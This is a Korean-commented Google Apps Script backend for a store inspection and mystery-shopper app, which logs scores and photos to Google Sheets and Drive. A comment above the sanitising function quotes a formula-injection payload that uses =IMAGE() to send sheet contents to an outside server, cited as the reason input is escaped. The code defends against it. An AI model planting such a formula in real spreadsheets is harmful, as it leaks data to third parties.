/* QSC 앱 백엔드 (Google Apps Script)
   제출 1번에 3곳 기록:
   ① 응답 원본 시트 (QSC_회차·QSC_상세·쇼퍼_응답) — 추적용 원장
   ② 통합시트 [데이터] — 해당 매장 행 x 해당 월 블록에 점수 기입 (QSC=위생 칸, 쇼퍼=CS 칸)
   ③ 매장별 QSC현황 파일 — 월 탭(YYMM)에 방문일·점수 + 적발 문항을 개선요청 표에 자동 행 추가

   배포 절차: script.google.com 새 프로젝트 → 이 코드 붙여넣기 → 아래 ID들 입력
   → 배포 > 새 배포 > 웹 앱 (실행: 나, 액세스: 모든 사용자) → URL을 js/api.js의 APPS_SCRIPT_URL에 입력

   ⚠어느 계정으로 만들 것인가: **QSC 담당자 개인 계정**(현재 tlsanstn93). '실행: 나'로 배포되므로
     스크립트는 그 계정 권한으로 동작한다. 통합시트는 보기 권한만 있으면 되고(읽기 전용으로 매장 목록만
     가져온다), 매장별 시트는 '링크가 있는 사람 편집 가능'이라 개인 계정으로도 쓸 수 있다.
     담당자가 바뀌면 프로젝트 소유권을 이전하면 되고, 그때도 배포 주소는 유지된다.

   드라이브 구조:
     📁 QSC (본사 계정)
        📊 QSC 통합시트          … DASHBOARD_ID   ← 개인 계정은 보기 권한만 (읽기 전용)
        📁 매장현황              … 매장별 QSC현황 시트 33개 (ID 불필요 — 통합시트 D열 링크에서 자동 추출)
     📁 QSC 사진 (개인 계정)      … PHOTO_FOLDER_ID
        2026 / QSC점검      / 매장 / 날짜   ← 관리자 점검 사진
        2026 / 미스터리쇼퍼 / 매장 / 날짜   ← 영수증
        2026 / 개선보고     / 매장 / 날짜   ← 매장이 올리는 개선 후 사진
     📊 QSC 응답 (개인 계정)      … SPREADSHEET_ID

   사진 보관 정책: 드라이브에는 올해치만. 새해에 지난해 폴더를 통째로 내려받아 로컬 보관 후 삭제.
                 사용량은 photoUsage()로 확인. 폴더 최상위를 '연도'로 둔 이유가 이 정리 때문이다.

   준비물: 사진 폴더 1개 + 응답 시트 1개(둘 다 개인 계정) + 통합시트 보기 권한.
          하위 폴더(연도/구분/매장/날짜)는 앱이 알아서 만든다. 매장별 파일 주소는 통합시트 D열
          하이퍼링크에서 자동으로 읽는다 (링크가 없는 매장만 '매장파일맵' 탭으로 보완 — 선택). */

/* 파일 ID는 코드에 적지 않는다 — 이 파일은 공개 GitHub 저장소에 올라간다.
   앱스 스크립트 편집기에서 [프로젝트 설정] > [스크립트 속성]에 아래 세 개를 등록할 것.
     SPREADSHEET_ID   응답 원본 저장용 'QSC 응답' 스프레드시트
     PHOTO_FOLDER_ID  사진 보관용 '사진' 폴더
     DASHBOARD_ID     '[감사총무팀_QSC] 통합시트'
   (실제 ID는 로컬 문서 `1. QSC\연동_설정값.md`에 기록해 두었다 — 저장소에 올리지 말 것) */
const PROPS = PropertiesService.getScriptProperties();
const SPREADSHEET_ID = PROPS.getProperty('SPREADSHEET_ID') || '';
const PHOTO_FOLDER_ID = PROPS.getProperty('PHOTO_FOLDER_ID') || '';
const DASHBOARD_ID = PROPS.getProperty('DASHBOARD_ID') || '';
const DASHBOARD_SHEET = '데이터';
/* 실전 기록 스위치 — 매장별 QSC현황 파일에 실제로 쓸지 여부.
   false = 응답 시트와 사진만 기록하고 매장 파일은 건드리지 않는다 (연동 시험용).
           2026-09까지는 기존 수기 방식으로 운영하므로 반드시 false로 둘 것.
   true  = 매장 파일 개선요청 표에 자동 기록 (2026-10-01 전환 시 켠다).
   ※ 켜고 끄는 것은 스크립트 속성 STORE_FILE_WRITE = 'true' 로도 가능 */
const STORE_FILE_WRITE = PROPS.getProperty('STORE_FILE_WRITE') === 'true';
/* 통합시트에 점수를 직접 쓸지 여부.
   false = 매장 목록·매장시트 링크를 '읽기'만 하고, 위생·CS 점수는 관리자가 직접 입력한다.
           통합시트가 공용 계정 전용 편집이라 개인 계정 스크립트로 운영할 때의 기본값.
   true  = 점수까지 자동 기입 (스크립트 실행 계정에 통합시트 편집 권한이 있을 때만).
   ※ 매장별 QSC현황 파일 기록은 이 값과 무관하게 동작한다 — 그 파일들은 링크 편집이 열려 있음 */
const DASHBOARD_WRITE = false;
const STORE_MAP_SHEET = '매장파일맵'; // 통합시트 안에 만들 탭: A=매장명, B=매장 파일 ID
const PHOTO_EMBED = true;    // true면 개선요청 표에 사진을 =IMAGE()로 삽입 (사진 파일이 '링크 있는 사용자 보기'로 공유됨) / false면 링크만

/* 통합시트 [데이터] 탭 실물 구조 (2026-08-15 확인)
     A 지역 · C 분류 · D 매장명(하이퍼링크로 매장 파일 연결) · 6행부터 매장, 숨김 행 = 관리 제외
   ⚠로컬 엑셀 사본과 한 칸 어긋나 있었다(사본은 E열). 실제 시트 기준은 D열. */
const STORE_NAME_COL = 4; // D열

/* 월 블록의 '위생(QSC) 점수' 열 번호 — 2026-08-15 실물 시트에서 직접 확인.
   블록 안 오프셋: +0 위생점수 +1 위생등급 +2 CS점수 +3 CS등급 +4 개선(요청 건수) +5 종합점수 +6 종합등급
   3·6·9·12월 뒤에 분기 평균 2열이 끼어 있어 간격이 7,7,9로 반복된다.
   ⚠종전 값은 전부 한 칸씩 밀려 있었다(로컬 엑셀 사본 기준이었음) — 매장명 D열 정정과 같은 원인.
     AY6 = 96%(금종제과 7월 위생)로 검증함. */
const MONTH_COL = { 1: 5, 2: 12, 3: 19, 4: 28, 5: 35, 6: 42, 7: 51, 8: 58, 9: 65, 10: 74, 11: 81, 12: 88 };
const YEAR_COL = { score: 97, grade: 98, improve: 99 }; // 연간 평균점수·등급·개선율 (CS·CT·CU열)

function doGet(e) {
  const action = e && e.parameter ? e.parameter.action : '';
  if (action === 'config') return json(getConfig());
  return json({ ok: true, service: 'qsc-app', time: new Date().toISOString() });
}

// 앱이 열릴 때마다 호출 — 통합시트의 "지금" 상태(표시 매장만)를 실시간으로 내려줌.
// 시트에서 매장을 추가·숨김·이름변경하면 앱은 다음 실행 때 자동 반영된다.
function getConfig() {
  try {
    const sh = SpreadsheetApp.openById(DASHBOARD_ID).getSheetByName(DASHBOARD_SHEET);
    const last = sh.getLastRow();
    const names = sh.getRange(6, STORE_NAME_COL, last - 5, 1).getValues();
    const stores = [];
    for (let i = 0; i < names.length; i++) {
      const name = String(names[i][0]).trim();
      if (!name) continue;
      if (sh.isRowHiddenByUser(6 + i)) continue; // 숨김 행 = 관리 제외 매장
      stores.push(name);
    }
    // 매장별 NA 프리셋 (지난 회차 NA 문항 번호)
    const naPresets = {};
    try {
      const ns = SpreadsheetApp.openById(SPREADSHEET_ID).getSheetByName('NA프리셋');
      if (ns) {
        const nv = ns.getDataRange().getValues();
        for (let i = 1; i < nv.length; i++) {
          if (!nv[i][0]) continue;
          naPresets[String(nv[i][0]).trim()] = String(nv[i][1] || '')
            .split(',').filter(String).map(Number);
        }
      }
    } catch (err) { /* 프리셋 없어도 config는 정상 반환 */ }
    return { ok: true, stores: stores, naPresets: naPresets, fetchedAt: new Date().toISOString() };
  } catch (err) {
    return { ok: false, error: String(err) };
  }
}

function doPost(e) {
  try {
    const body = JSON.parse(e.postData.contents);
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    if (body.type === 'qsc') return saveQsc(ss, body.payload);
    if (body.type === 'shopper') return saveShopper(ss, body.payload);
    return json({ ok: false, error: 'unknown type: ' + body.type });
  } catch (err) {
    return json({ ok: false, error: String(err) });
  }
}

/* ---------- ① 응답 원본 ---------- */

function saveQsc(ss, p) {
  const photoMap = savePhotos(p); // {문항no: [{url, id}]}
  // v3.7 절대 감점제 스키마: 대분류 점수 대신 감점 3층 + 중대 차감 기록
  const sum = sheet(ss, 'QSC_회차', ['제출시각', '점검일자', '방문시간', '매장명', '점검자', 'QSC점수', '등급',
    '일반감점', '★차감', '★★차감', '중대차감합계', '응답수', '사진수']);
  const r = p.result || {};
  let photoN = 0;
  p.items.forEach(function (it) { photoN += (photoMap[it.no] || []).length; });
  sum.appendRow(safeRow([p.submittedAt, p.date, p.time || '', p.store, p.inspector,
    r.qsc == null ? '' : round1(r.qsc), r.grade || '',
    r.genDeduct || 0, (r.s2 && r.s2.deduct) || 0, (r.s1 && r.s1.deduct) || 0, r.criticalDeduct || 0,
    p.items.filter(function (it) { return it.value !== null; }).length, photoN]));

  const det = sheet(ss, 'QSC_상세', ['점검일자', '방문시간', '매장명', '코드', '문항번호', '구분', '문항', '등급구분', '개선필요건수', '상태', '감점', '비고', '사진']);
  const rows = p.items
    .filter(function (it) { return it.value !== null; })
    .map(function (it) {
      const sev = it.severity === 'S1' ? '★★' : it.severity === 'S2' ? '★' : '';
      return safeRow([p.date, p.time || '', p.store, it.code || '', it.no, it.group || '', it.text, sev,
        String(it.value), it.rating || '', it.deduct == null ? '' : -it.deduct,
        it.memo || '', (photoMap[it.no] || []).map(function (x) { return x.url; }).join('\n')]);
    });
  if (rows.length) det.getRange(det.getLastRow() + 1, 1, rows.length, rows[0].length).setValues(rows);

  // 매장별 NA 프리셋 갱신 — 다음 회차에 앱이 자동 제안 (?action=config로 내려감)
  try {
    const naSheet = sheet(ss, 'NA프리셋', ['매장명', 'NA문항', '갱신일']);
    const naNos = p.items.filter(function (it) { return it.value === 'NA'; })
      .map(function (it) { return it.no; }).join(',');
    const vals = naSheet.getDataRange().getValues();
    let found = -1;
    for (let i = 1; i < vals.length; i++) {
      if (String(vals[i][0]).trim() === p.store.trim()) { found = i + 1; break; }
    }
    if (found > 0) naSheet.getRange(found, 2, 1, 2).setValues([[naNos, p.date]]);
    else naSheet.appendRow([p.store, naNos, p.date]);
  } catch (err) { /* 프리셋 실패는 저장에 영향 없음 */ }

  // ②③ 연동 기록 — 실패해도 원본 저장은 유지하고 결과만 알림
  const extra = { dashboard: null, storeFile: null };
  if (DASHBOARD_ID) {
    if (DASHBOARD_WRITE) {
      try {
        extra.dashboard = p.result.final == null ? { ok: false, error: '점수 없음' }
          : writeDashboard(p.store, p.date, p.result.final / 100, 0);
      } catch (err) { extra.dashboard = { ok: false, error: String(err) }; }
    } else {
      extra.dashboard = { ok: true, skipped: true, note: '통합시트 점수는 직접 입력' };
    }
    if (STORE_FILE_WRITE) {
      try { extra.storeFile = writeStoreQsc(p, photoMap); }
      catch (err) { extra.storeFile = { ok: false, error: String(err) }; }
    } else {
      extra.storeFile = { ok: true, skipped: true, note: '매장 파일 기록 꺼짐 (시험 운영)' };
    }
  }
  return json({ ok: true, saved: rows.length, photos: photoN, dashboard: extra.dashboard, storeFile: extra.storeFile });
}

function saveShopper(ss, p) {
  const receipts = saveReceipts(p); // 영수증 사진 → 드라이브, 링크만 시트에
  const sh = sheet(ss, '쇼퍼_응답', ['제출시각', '방문날짜', '방문시간', '매장명', '응대직원설명', '주문내역', '작성자연령대성별', '입력경로', '점수', '응답수', '영수증']
    .concat(p.answers.map(function (a) { return 'Q' + a.no; })));
  sh.appendRow(safeRow([p.submittedAt, p.date, p.time || '', p.store, p.staff, p.order, p.demographic,
    p.source === 'customer' ? '고객 직접' : '관리자 입력',
    p.result.score == null ? '' : round1(p.result.score), p.result.answered, receipts.join('\n')]
    .concat(p.answers.map(function (a) { return a.answer || ''; }))));

  // 문항별 이유·비고 — 작성된 것만 1행씩 (추적용, 특히 '아니오'의 근거)
  const memoRows = p.answers.filter(function (a) { return a.memo; }).map(function (a) {
    return safeRow([p.submittedAt, p.date, p.time || '', p.store, p.source === 'customer' ? '고객 직접' : '관리자 입력',
      a.no, a.text, a.answer || '', a.memo]);
  });
  if (memoRows.length) {
    const ms = sheet(ss, '쇼퍼_비고', ['제출시각', '방문날짜', '방문시간', '매장명', '입력경로', '문항번호', '문항', '응답', '비고']);
    ms.getRange(ms.getLastRow() + 1, 1, memoRows.length, memoRows[0].length).setValues(memoRows);
  }

  // 통합시트 CS 칸 + 매장 파일 CS점수: 같은 달 쇼퍼가 여러 명이면 "해당 월 평균"으로 기록
  const extra = { dashboard: null, storeFile: null };
  if (DASHBOARD_ID && p.result.score != null) {
    try {
      const avg = shopperMonthAvg(sh, p.store, p.date);
      extra.dashboard = DASHBOARD_WRITE
        ? writeDashboard(p.store, p.date, avg / 100, 2)
        : { ok: true, skipped: true, note: '통합시트 CS 점수는 직접 입력', monthAvg: round1(avg) };
      extra.storeFile = STORE_FILE_WRITE
        ? writeStoreShopper(p.store, p.date, avg / 100)
        : { ok: true, skipped: true, note: '매장 파일 기록 꺼짐 (시험 운영)' };
    } catch (err) { extra.dashboard = { ok: false, error: String(err) }; }
  }
  return json({ ok: true, dashboard: extra.dashboard, storeFile: extra.storeFile });
}

function shopperMonthAvg(sh, store, dateStr) {
  const ym = dateStr.slice(0, 7); // 'YYYY-MM'
  const vals = sh.getDataRange().getValues();
  const scores = [];
  for (let i = 1; i < vals.length; i++) {
    const d = vals[i][1];
    const dYm = (d instanceof Date)
      ? d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0')
      : String(d).slice(0, 7);
    // 열 순서: 0 제출시각 · 1 방문날짜 · 2 방문시간 · 3 매장명 … 7 입력경로 · 8 점수
    // ⚠'관리자 입력'만 센다. survey.html은 누구나 열 수 있으므로, 이 조건이 없으면
    //   아무나 특정 매장 이름으로 0점 설문을 여러 건 넣어 그 달 CS 평균을 끌어내릴 수 있다.
    //   그 평균은 매장 파일 CS 칸과 통합시트로 흘러가고, 10월부터 CS는 종합점수의 30%다.
    //   (고객 설문은 시트에 그대로 쌓이되 공식 점수 집계에서만 빠진다 — 제출 코드 검증이
    //    붙기 전까지는 참고 자료로만 본다)
    if (String(vals[i][3]).trim() === store.trim() && dYm === ym &&
        String(vals[i][7]).trim() === '관리자 입력' && typeof vals[i][8] === 'number') {
      scores.push(vals[i][8]);
    }
  }
  if (!scores.length) return 0;
  return scores.reduce(function (a, b) { return a + b; }, 0) / scores.length;
}

/* ---------- ② 통합시트 [데이터] ---------- */

// offset: 0 = 위생(QSC) 점수 열, 2 = CS(쇼퍼) 점수 열. 등급·종합 열은 시트 수식이라 건드리지 않는다.
function writeDashboard(store, dateStr, frac, offset) {
  const sh = SpreadsheetApp.openById(DASHBOARD_ID).getSheetByName(DASHBOARD_SHEET);
  const month = parseInt(dateStr.slice(5, 7), 10);
  const col = MONTH_COL[month] + offset;
  const last = sh.getLastRow();
  const names = sh.getRange(6, STORE_NAME_COL, last - 5, 1).getValues(); // D6부터 매장명
  for (let i = 0; i < names.length; i++) {
    if (String(names[i][0]).trim() === store.trim()) {
      const row = 6 + i;
      sh.getRange(row, col).setValue(frac);
      return { ok: true, cell: sh.getRange(row, col).getA1Notation() };
    }
  }
  return { ok: false, error: '통합시트에 매장 행 없음: ' + store };
}

/* ---------- ③ 매장별 QSC현황 파일 ---------- */

// 매장 파일 주소는 통합시트 D열 매장명 셀에 걸린 하이퍼링크에서 그대로 뽑는다.
// (관리자가 이미 매장별 시트 링크를 걸어두고 쓰던 구조 — 별도 매핑 탭이 필요 없다.
//  매장이 바뀌어도 링크만 걸면 앱이 자동으로 따라간다.)
function storeFileId(store) {
  const sh = SpreadsheetApp.openById(DASHBOARD_ID).getSheetByName(DASHBOARD_SHEET);
  const last = sh.getLastRow();
  if (last < 6) return storeFileIdFromMap(store);
  const rng = sh.getRange(6, STORE_NAME_COL, last - 5, 1); // D6부터 매장명
  const names = rng.getValues();
  const rich = rng.getRichTextValues();
  for (let i = 0; i < names.length; i++) {
    if (String(names[i][0]).trim() !== store.trim()) continue;
    const rt = rich[i][0];
    let url = rt ? rt.getLinkUrl() : null;
    if (!url && rt) { // 셀 일부에만 링크가 걸린 경우
      const runs = rt.getRuns();
      for (let k = 0; k < runs.length && !url; k++) url = runs[k].getLinkUrl();
    }
    const m = url ? String(url).match(/\/d\/([a-zA-Z0-9_-]{20,})/) : null;
    if (m) return m[1];
    break;
  }
  return storeFileIdFromMap(store); // 링크가 없는 매장만 폴백
}

// 폴백: 통합시트 안에 '매장파일맵' 탭(A=매장명, B=파일ID)이 있으면 그것도 인정
function storeFileIdFromMap(store) {
  const sh = SpreadsheetApp.openById(DASHBOARD_ID).getSheetByName(STORE_MAP_SHEET);
  if (!sh) return null;
  const vals = sh.getDataRange().getValues();
  for (let i = 0; i < vals.length; i++) {
    if (String(vals[i][0]).trim() === store.trim() && vals[i][1]) return String(vals[i][1]).trim();
  }
  return null;
}

function yymm(dateStr) { return dateStr.slice(2, 4) + dateStr.slice(5, 7); } // '2026-08-10' → '2608'

// 라벨 셀을 찾아 그 오른쪽 칸에 기록 (월 탭 레이아웃이 조금 달라도 동작)
function setByLabel(sh, label, value) {
  const vals = sh.getRange(1, 1, 15, 12).getValues();
  for (let r = 0; r < vals.length; r++) {
    for (let c = 0; c < vals[r].length; c++) {
      if (String(vals[r][c]).trim() === label) {
        sh.getRange(r + 1, c + 2).setValue(value);
        return true;
      }
    }
  }
  return false;
}

function writeStoreQsc(p, photoMap) {
  const id = storeFileId(p.store);
  if (!id) return { ok: false, error: STORE_MAP_SHEET + '에 매장 없음: ' + p.store };
  const ss = SpreadsheetApp.openById(id);
  const tab = yymm(p.date);
  const sh = ss.getSheetByName(tab);
  if (!sh) return { ok: false, error: '월 탭 없음: ' + tab };

  setByLabel(sh, '방문일', p.date);
  if (p.time) setByLabel(sh, '방문시간', p.time); // 월 탭에 라벨이 없으면 조용히 건너뜀
  if (p.result.final != null) setByLabel(sh, '위생점수', p.result.final / 100);

  // 개선요청 표: B열에서 'NO.' 헤더 행을 찾고, J열 첫 빈 행부터 개선 필요 문항(1건 이상)을 추가
  const found = p.items.filter(function (it) { return typeof it.value === 'number' && it.value >= 1; });
  if (!found.length) return { ok: true, tickets: 0 };

  const colBRange = grid(sh, 1, 2, 60, 1);
  const colB = colBRange ? colBRange.getValues() : [];
  let headRow = -1;
  for (let i = 0; i < colB.length; i++) {
    if (String(colB[i][0]).trim().toUpperCase().indexOf('NO') === 0) { headRow = i + 1; break; }
  }
  if (headRow < 0) return { ok: false, error: "개선요청 표 헤더(B열 'NO.')를 못 찾음: " + tab };

  const colJRange = grid(sh, headRow + 1, 10, 200, 1);
  const colJ = colJRange ? colJRange.getValues() : [];
  let used = 0;
  for (let i = 0; i < colJ.length; i++) { if (String(colJ[i][0]).trim() !== '') used = i + 1; }
  const row = headRow + 1 + used;
  let no = used;

  /* 표가 모자라면 예외로 죽는 대신 쓸 수 있는 만큼만 쓴다 —
     한 회차 지적이 남은 빈 행보다 많을 수 있다(사람이 만든 탭은 행 수가 제각각). */
  const room = sh.getMaxRows() - row + 1;
  const list = found.slice(0, Math.max(0, room));
  if (!list.length) return { ok: false, error: '개선요청 표에 빈 행이 없음: ' + tab };

  const bc = [], d = [], j = [];
  list.forEach(function (it) {
    no += 1;
    const photos = photoMap[it.no] || [];
    const cnt = (typeof it.value === 'number' && it.value > 0) ? ' (' + it.value + '건)' : '';
    const sev = it.severity === 'S1' ? '[★★ 중대] ' : it.severity === 'S2' ? '[★ 중대] ' : '';
    // 비고와 2번째 이후 사진은 갈 칸이 없다(표가 O열에서 끝남) → 본문 뒤에 붙인다
    const tail = (it.memo ? '\n· ' + it.memo : '') +
      (photos.length > 1 ? '\n· 사진 ' + photos.length + '장: ' +
        photos.map(function (x) { return x.url; }).join(' ') : '');
    bc.push([no, safe(it.group || '')]);
    d.push([photos.length ? (PHOTO_EMBED ? imageFormula(photos[0].id) : photos[0].url) : '']);
    j.push([safe(sev + (it.code ? it.code + ' ' : '') + it.text + cnt + tail)]);
  });

  /* ⚠B~P를 한 번에 쓰면 안 된다. 데이터 행마다 D:I가 병합돼 있어 E~I 값은 조용히 버려지고,
     무엇보다 **O열(매장이 올린 개선 후 사진)이 빈 값으로 덮여 지워진다.**
     예외가 안 나서 알아채지도 못한다. 그래서 본사 몫인 B·C / D / J 만 따로 쓰고
     매장 몫인 K~O(담당부서·담당자·진행·완료·개선 후 사진)는 절대 건드리지 않는다. */
  sh.getRange(row, 2, bc.length, 2).setValues(bc);  // B:C
  sh.getRange(row, 4, d.length, 1).setValues(d);    // D (병합 D:I의 좌상단)
  sh.getRange(row, 10, j.length, 1).setValues(j);   // J
  return { ok: true, tickets: list.length, tab: tab, skipped: found.length - list.length };
}

function writeStoreShopper(store, dateStr, frac) {
  const id = storeFileId(store);
  if (!id) return { ok: false, error: STORE_MAP_SHEET + '에 매장 없음: ' + store };
  const sh = SpreadsheetApp.openById(id).getSheetByName(yymm(dateStr));
  if (!sh) return { ok: false, error: '월 탭 없음: ' + yymm(dateStr) };
  return { ok: setByLabel(sh, 'CS점수', frac) };
}

/* ---------- 사진 ---------- */

function savePhotos(p) {
  const out = {};
  if (!PHOTO_FOLDER_ID) return out;
  let dayFolder = null;
  p.items.forEach(function (it) {
    (it.photos || []).forEach(function (dataUrl, i) {
      if (!dayFolder) dayFolder = subFolder(subFolder(yearFolder(p.date, 'QSC점검'), p.store), p.date);
      const base64 = dataUrl.split(',')[1];
      const blob = Utilities.newBlob(Utilities.base64Decode(base64), 'image/jpeg',
        p.date + '_' + p.store + '_문항' + it.no + '_' + (i + 1) + '.jpg');
      const f = dayFolder.createFile(blob);
      if (PHOTO_EMBED) f.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
      (out[it.no] = out[it.no] || []).push({ url: f.getUrl(), id: f.getId() });
    });
  });
  return out;
}

// 쇼퍼 영수증 사진 — '미스터리쇼퍼/매장/날짜' 폴더에 저장하고 링크 배열 반환
function saveReceipts(p) {
  if (!PHOTO_FOLDER_ID || !p.receipts || !p.receipts.length) return [];
  try {
    const dir = subFolder(subFolder(yearFolder(p.date, '미스터리쇼퍼'), p.store), p.date);
    return p.receipts.map(function (dataUrl, i) {
      const blob = Utilities.newBlob(Utilities.base64Decode(dataUrl.split(',')[1]), 'image/jpeg',
        p.date + '_' + p.store + '_영수증_' + (i + 1) + '.jpg');
      return dir.createFile(blob).getUrl();
    });
  } catch (err) {
    return ['사진 저장 실패: ' + String(err)]; // 응답 자체는 저장되어야 한다
  }
}

/* 사진 폴더는 '연도'를 맨 위에 둔다 — 연말에 그 해 폴더 하나만 내려받고 지우면 정리가 끝나도록.
     QSC 사진 / 2026 / QSC점검     / 매장 / 날짜
              / 2026 / 미스터리쇼퍼 / 매장 / 날짜
   보관 정책: 드라이브에는 올해치만. 새해가 되면 지난해 폴더를 통째로 내려받아 로컬 보관 후 삭제. */
function yearFolder(dateStr, kind) {
  const year = String(dateStr).slice(0, 4) || String(new Date().getFullYear());
  return subFolder(subFolder(DriveApp.getFolderById(PHOTO_FOLDER_ID), year), kind);
}

/* 처음 한 번만 — 사진 폴더를 만들고 그 ID를 실행 로그에 찍는다.
   드라이브 화면에서 폴더를 만들고 주소를 복사하는 것보다 이쪽이 확실하다.
   찍힌 값을 [프로젝트 설정] > [스크립트 속성]의 PHOTO_FOLDER_ID에 넣으면 된다. */
function setupPhotoFolder() {
  const it = DriveApp.getFoldersByName('QSC 사진');
  const f = it.hasNext() ? it.next() : DriveApp.createFolder('QSC 사진');
  Logger.log('PHOTO_FOLDER_ID = ' + f.getId());
  return f.getId();
}

/* 지금 사진이 드라이브를 얼마나 쓰고 있는지 연도별로 알려준다 (앱스 스크립트에서 직접 실행).
   무료 15GB 안에서 도니, 모르는 채 차오르지 않게 가끔 확인할 것. */
function photoUsage() {
  if (!PHOTO_FOLDER_ID) return '사진 폴더 ID가 비어 있음';
  function size(folder) {
    let bytes = 0, n = 0;
    const files = folder.getFiles();
    while (files.hasNext()) { bytes += files.next().getSize(); n++; }
    const subs = folder.getFolders();
    while (subs.hasNext()) { const r = size(subs.next()); bytes += r.bytes; n += r.n; }
    return { bytes: bytes, n: n };
  }
  const root = DriveApp.getFolderById(PHOTO_FOLDER_ID);
  const lines = [];
  let total = 0;
  const years = root.getFolders();
  while (years.hasNext()) {
    const y = years.next();
    const r = size(y);
    total += r.bytes;
    lines.push(y.getName() + ' : ' + Math.round(r.bytes / 1048576) + 'MB · 사진 ' + r.n + '장');
  }
  lines.sort();
  const msg = lines.join('\n') + '\n────────\n합계 ' + Math.round(total / 1048576) + 'MB';
  Logger.log(msg);
  return msg;
}

function subFolder(parent, name) {
  const it = parent.getFoldersByName(name);
  return it.hasNext() ? it.next() : parent.createFolder(name);
}

/* ---------- 공용 ---------- */

/* 수식 주입 차단 — 시트에 쓰는 사용자 입력 문자열은 반드시 이걸 통과시킨다.
   구글시트는 = + - @ 로 시작하는 문자열을 '수식'으로 저장한다. 그중 =IMAGE()는
   사람이 아무것도 누르지 않아도 셀이 계산될 때 외부 주소를 자동으로 불러온다.
   즉 고객 설문 비고칸에 =IMAGE("https://남의서버/?d="&JOIN(",",어느탭!A1:A50)) 한 줄이면
   시트 내용이 그대로 밖으로 나간다. 앞에 아포스트로피를 붙이면 문자열로 굳고 화면에는 안 보인다.
   ※ 서버가 의도적으로 만드는 수식은 imageFormula() 하나뿐이며 파일 ID만 받는다. */
function safe(v) {
  if (v == null) return '';
  if (typeof v !== 'string') return v;
  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
}
function safeRow(arr) { return arr.map(safe); }

/* 요청한 크기가 시트 그리드를 넘으면 Apps Script는 잘라주지 않고 예외를 던진다.
   매장 월 탭은 사람이 만든 것이라 행 수가 제각각이므로, 조용히 짧게 읽는 편이 항상 낫다. */
function grid(sh, row, col, nRows, nCols) {
  const r = Math.min(nRows, sh.getMaxRows() - row + 1);
  const c = Math.min(nCols, sh.getMaxColumns() - col + 1);
  if (r <= 0 || c <= 0) return null;
  return sh.getRange(row, col, r, c);
}

/* 드라이브 사진을 시트·앱에서 보여줄 수 있는 유일한 주소 형식.
   예전에 쓰던 drive.google.com/uc?export=view 는 구글이 확인 페이지로 바꿔서
   =IMAGE()에서도 <img>에서도 더 이상 그림이 뜨지 않는다. */
function photoUrl(fileId) { return 'https://lh3.googleusercontent.com/d/' + fileId + '=w800'; }
function imageFormula(fileId) {
  if (!/^[a-zA-Z0-9_-]{20,}$/.test(String(fileId))) return ''; // 서버가 수식을 만드는 유일한 지점
  return '=IMAGE("' + photoUrl(fileId) + '")';
}

function sheet(ss, name, headers) {
  let sh = ss.getSheetByName(name);
  if (!sh) { sh = ss.insertSheet(name); sh.appendRow(headers); sh.setFrozenRows(1); }
  return sh;
}

function round1(n) { return Math.round(n * 10) / 10; }

function json(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON);
}
